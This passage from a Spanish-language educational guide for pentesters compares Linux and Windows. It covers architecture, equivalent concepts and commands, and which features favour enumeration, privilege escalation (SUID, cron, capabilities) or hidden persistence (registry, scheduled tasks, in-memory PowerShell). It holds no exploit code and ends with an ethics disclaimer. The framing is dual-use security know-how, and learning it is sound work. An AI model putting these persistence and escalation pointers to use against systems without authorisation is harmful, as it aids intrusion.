| [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) | Monolitico (Linux) | Hibrido (NT) |
| [sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos) | ext4, XFS, Btrfs (nativo) | NTFS, FAT32, exFAT |
| [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) | rwx + ACL + [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities) | NTFS ACL + Share permissions |
| Shell | Bash, Zsh, Fish | CMD, [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) |
| Gestor de paquetes | apt, dnf, pacman | WinGet, MSI, Chocolatey |
| Init | [systemd](../raw/l1n9x-4dm1n.md#systemd), sysvinit | services.exe (SCM) |
| Logs | /var/log/, journald | Event Viewer, .[evtx](../raw/w1n-f0r3ns1cs.md#event-logs) |
| Registry | Sin equivalente nativo | Registro de Windows |
| Dominio | LDAP, FreeipA, SSSD | [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md) |
| procesos | ps, top, htop | tasklist, Task Manager, Process Explorer |
| Servicios | systemctl, service | sc, net start, services.msc |
| firewallc | iptables, nftables, ufw | Windows [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) (netsh advfirewall) |
| Remoto | SSH | RDP, WinRM |
| [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) | Kernel module (.ko) | .sys [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) |
| API | syscalls + glibc | Win32 API + .NET |
| [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) | Bash, [python](../raw/pyth0n-f0r-h4ck1ng.md) | PowerShell, VBScript |
| Tareas programadas | [cron](../raw/l1n9x-pr1v3sc.md#cron-jobs), systemd timers | Task Scheduler (schtasks) |

### 4.2 Conceptos equivalentes

| Concepto | Linux | Windows |
|----------|-------|---------|
| Root | root (UID 0) | SYSTEM, Administrador |
| Home | /home/usuario | C:\Users\Usuario |
| PATH [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) | $PATH | %PATH% |
| Dynamic libraries | .so (ldconfig) | .dll (DLL Hell) |
| Device files | /dev/sda | \\.\PhysicalDrive0 |
| Mount points | /mnt/disco | C:\ o carpeta montada |
| Symbolic links | ln -s | mklink |
| Environment vars | export VAR=val | [set](../raw/ph1sh1ng.md#social-engineering-toolkit) VAR=val o [Environment] |
| Runlevels | multi-user.target | Servicios automaticos |
| Aliases | alias ll=.. | Set-Alias o doskey |
| History | ~/.bash_history | %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt |

### 4.3 Diferencias filosoficas

**Monolito vs modulos:**
- Linux kernel es monolitico pero modular. podes cargar/descargar modulos en caliente.
- Windows NT es hibrido: parte del kernel corre en modo kernel, parte en user mode.

**Todo es archivo vs todo es objeto:**
- Linux: todo es un archivo (dispositivos, procesos, configuracion).
- Windows: el registro centraliza configuracion, las API son orientadas a objetos ([com](../raw/w1n-s9bsyst3ms.md#com), .NET).

**Texto vs binario:**
- Linux prefiere configuracion en texto plano (/etc/passwd, /etc/ssh/sshd_config).
- Windows usa formatos binarios (SAM, registro, .evtx).

**Centralizado vs distribuido:**
- Linux tradicionalmente mas distribuido (cada herramienta hace una cosa).
- Windows mas centralizado (registro, [wmi](../raw/w1n-s9bsyst3ms.md#wmi), [group policy](../raw/w1nd0ws-d0m41n-4dm1n.md#group-policy)).

### 4.4 Lo que importa para pentesting

**Linux favorece la enumeracion:**
- /proc, /sys, /etc son legibles por cualquier usuario.
- Los permisos [suid](../raw/l1n9x-pr1v3sc.md#suid)/SGID, capabilities y cron jobs son vectores clasicos de escalada.
- Logs en texto plano faciles de grep.
- Las herramientas de [red](../raw/r3d3s-f0nd4m3nt0s.md) ([nmap](../raw/nm4p.md), [netcat](../raw/r3v3rs3-sh3lls.md#netcat), tcpdump) estan nativas o son faciles de instalar.

**Windows favorece la [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia):**
- El registro tiene infinitos lugares para esconder persistencia.
- Las tareas programadas y servicios son faciles de crear.
- PowerShell permite ejecucion en memoria (living off the land).
- Active Directory es un ecosistema completo de ataque (Kerberos, NTLM, [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb)).

**El mejor approach:** aprender ambos y entender las diferencias. La mayoria de los entornos corporativos son mixtos (Linux servers + Windows desktops + [ad](../raw/w1nd0ws-d0m41n-4dm1n.md)). Saber moverte en ambos mundos es lo que separa un pentester promedio de uno gros.

---
### 4.5 Guia rapida de comandos equivalentes

| Tarea | Linux | Windows CMD | Windows PowerShell |
|-------|-------|-------------|-------------------|
| Listar archivos | ls | dir | Get-ChildItem |
| Cambiar directorio | cd | cd | Set-Location |
| Copiar archivo | cp | copy | Copy-Item |
| Mover archivo | mv | move | Move-Item |
| Borrar archivo | rm | del | Remove-Item |
| Crear directorio | mkdir | mkdir | New-Item -ItemType Directory |
| Ver contenido | cat | type | Get-Content |
| Buscar texto | grep | findstr | Select-String |
| Ver procesos | ps | tasklist | Get-Process |
| Matar [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) | kill | taskkill | Stop-Process |
| Ver servicios | systemctl | sc query | Get-Service |
| Ver red | [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) a | ipconfig | Get-NetIPAddress |
| Ver puertos | ss -tulpn | netstat -ano | Get-NetTCPConnection |
| Ver rutas | ip route | route print | Get-NetRoute |
| Ver firewall | iptables -L | netsh advfirewall | Get-NetFirewallRule |
| Ver logs | [journalctl](../raw/l1n9x-4dm1n.md#journalctl) | wevtutil | Get-WinEvent |
| Ver usuarios | cat /etc/passwd | net user | Get-LocalUser |
| Ver grupos | cat /etc/group | net localgroup | Get-LocalGroup |
| Cambiar permisos | [chmod](../raw/0s-f0nd4m3nt0s.md#permisos) | icacls | Set-Acl |
| Cambiar duenio | chown | takeown + icacls | Set-Acl |
| Ver disco | df -h | fsutil volume diskfree | Get-Volume |
| Ver particiones | fdisk -l | diskpart | Get-Disk |
| Ver fecha | date | date | Get-Date |
| Ver hora | uptime | systeminfo | (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime |
| Ver variables | env | set | Get-ChildItem Env: |
| Historial | history | doskey /history | Get-History |
| Ayuda | man comando | comando /? | Get-Help comando |
| Ejecutar como admin | [sudo](../raw/l1n9x-pr1v3sc.md#sudo) comando | runas | Start-Process -Verb RunAs |
| Shell remoto | ssh user@host | mstsc /v:host | Enter-PSSession host |

### 4.6 Reflexion final

Saber sistemas operativos no es opcional para un pentester. Es la base de todo. Cada [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades), cada tecnica de explotacion, cada movimiento lateral, cada evasion, cada persistencia -- todo se apoya en entender como funciona el SO.

Este documento cubre los fundamentos. Pero la verdadera maestria viene con la practica:
- Arma laboratorios en VirtualBox/VMware.
- Rompe cosas y fijate como reacciona el sistema.
- Lee los logs despues de un ataque.
- Practica la enumeracion manual sin herramientas automaticas.
- Aprende a leer el codigo fuente del kernel y las implementaciones de syscalls.

El conocimiento de sistemas operativos es el superpoder que te permite ver lo que otros no ven.

---

> **Fin del documento.** Creado con fines educativos. El conocimiento compartido aca es para entender y defender sistemas, no para atacarlos sin [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion). La [seguridad informatica](../raw/s3c-f0nd4m3nt0s.md) empieza por la etica.

---

